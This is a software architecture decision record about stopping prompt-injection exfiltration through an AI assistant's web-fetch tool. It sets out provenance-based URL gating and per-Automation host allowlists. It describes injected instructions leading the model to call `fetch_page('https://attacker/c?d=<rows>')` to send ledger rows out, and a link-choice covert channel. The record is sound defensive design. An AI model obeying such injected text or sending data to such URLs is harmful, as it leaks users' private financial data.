---
title: A fetch runs unasked only for a URL the user or a search supplied; an Automation names the websites it may open
status: Accepted
date: 2026-10-17
deciders: repo owner (chose the design) + Claude (built it)
---

# 2026-10-17. A fetch runs unasked only for a URL the user or a search supplied; an Automation names the websites it may open

Supersedes the "known and accepted" status of the KNOWN_ISSUES entry *"a prompt injection can
send the ledger out in a `fetch_page` URL"* (owner decision 2026-10-05), and builds the fix
direction it named: scope outbound fetches per Automation by host, with no length heuristic.

## Context

`fetch_page` is read-classified, so it resolved to `always_allow` with no card on any surface.
Its argument is a whole URL the model writes, which makes it the one "read" that sends data out:
an instruction planted in an email, a statement memo or a fetched page can chain a ledger read
into `fetch_page("https://attacker/c?d=<rows>")`. Permissions are name-keyed, so the table cannot
tell that call from reading a news article. A 256-character cap on the query once bounded the
damage. It was removed on 2026-10-05 because the unattended email-scan Automation must open
signed receipt links (a Steam receipt's ~900-character `sparams` token), so a length rule cannot
be the fix.

## Decision

- **Provenance, not shape.** `fetch_page`, and every per-provider `<id>_fetch_page`
  (`ai/tools/web_search_providers`), runs unasked when the URL's `core.urls.fetch_key` (host
  and port lowercased, scheme and fragment dropped, path and query byte-for-byte) is one the user
  typed or a web-search tool returned, in this conversation and process lifetime
  (`ai/tools/_fetch_gate.py`). Those URLs existed before the model read anything, so they cannot
  carry what it read. Appending `&d=…` makes a new key. `canonical_url` is not used, because it
  drops tracking parameters, and `?utm_x=<data>` is data on the wire.
- **What counts as typed.** Web chat records the text the person typed, in `api/chat`, BEFORE
  the mention, cached-brief and screen blocks are merged onto the message: those are
  third-party text, and with nothing typed one would lead the merged message. `assistant.run`
  records only a chat connector's message and queued messages, which carry no merged context.
  Within a message, the first text part after any attachment refs counts (the caption follows
  the refs). Automation runs and unattended turns record nothing:
  their "user" message carries a trigger payload such as an email body.
- **What does not count.** A URL that was only *seen* in a fetched page, an email or a news item.
  A planted email with seventy fixed links ("open link N for digit N") leaks a number through the
  choice alone.
- **Everything else asks.** It gets the ordinary `stage_generic` card with a reason that says why,
  wherever a card can be shown: chat, a chat connector, or an Automation conversation (the run
  waits). Where no card can be shown (a scheduled headless run, inbound MCP, no surface), the gate
  refuses with `blocked_by: fetch_provenance`. It never fails open, unlike the write gate's surface
  check, because failing open is the exfiltration.
- **Standing owner decisions still win, never degraded.** In chat: a stored `always_allow` for
  `fetch_page`, the conversation's `skip` mode, YOLO. `auto` mode asks, because sending data to a
  host nobody named is the kind of call `auto` keeps for a human. Inside an Automation, only that
  Automation's own grants count (`always_allowed`, `skip` mode, `fetch_hosts`). A run never
  inherits a global grant, as `automation_gate_verdict` already holds.
- **`fetch_hosts`, per Automation.** The owner lists the websites a run may open unasked;
  subdomains are included, lookalikes are not (`core.urls.host_allowed`). Entries are stored
  normalised and validated by name (`services/automations/service._validate_fetch_hosts`), at most
  50. The field is not on `_AI_UPDATABLE_FIELDS`, so Lucius can never write it, and a
  prompt-injected create or update cannot widen it. **Always allow** on a fetch card in a run adds
  that card's host (identified by its `tool_use_id`) to `fetch_hosts`, never `fetch_page` to
  `always_allowed`. Without a `tool_use_id` (an old client), it applies only when exactly one fetch
  card is open; otherwise the tap keeps its old whole-tool meaning, because one tap must not
  consent to two websites.

## Consequences

- Following a link from a fetched page now costs one tap in chat. Multi-hop research stays
  possible: search results run unasked, and **Always allow** in chat stops the check for every
  chat, which the card says.
- A URL typed before a restart asks once after it, because the registry is in-process and
  bounded (256 sessions × 500 URLs). The saved transcript is deliberately not read back: its
  user-role entries include folded summaries and trigger payloads.
- The email-scan Automation needs its receipt senders' hosts in **Websites it may open without
  asking**, or one **Always allow** tap per sender. Until then, its runs wait on a card for each
  receipt link.
- Per-provider fetch tools (`<id>_fetch_page`) pass the same gate. They are connector-owned and
  default to **Needs approval**, but an **Always allow** on one, or one in an Automation's grants,
  would otherwise have been a way around it. **Always allow** on one of their cards in a run adds
  the website too.
- The Automation editor never pre-fills `fetch_hosts` from a draft Lucius proposes
  (`automations.review_draft`): the list starts from the saved Automation only.
- Related, same day: AI HTML artifacts render inside a shell whose `frame-src 'none'` stops the
  artifact navigating its own frame to a URL carrying data (`services/artifact_frame.frame_shell`).
  CSP cannot block self-navigation, and the app page's `frame-src` must allow `https:` for the
  Embed widget.
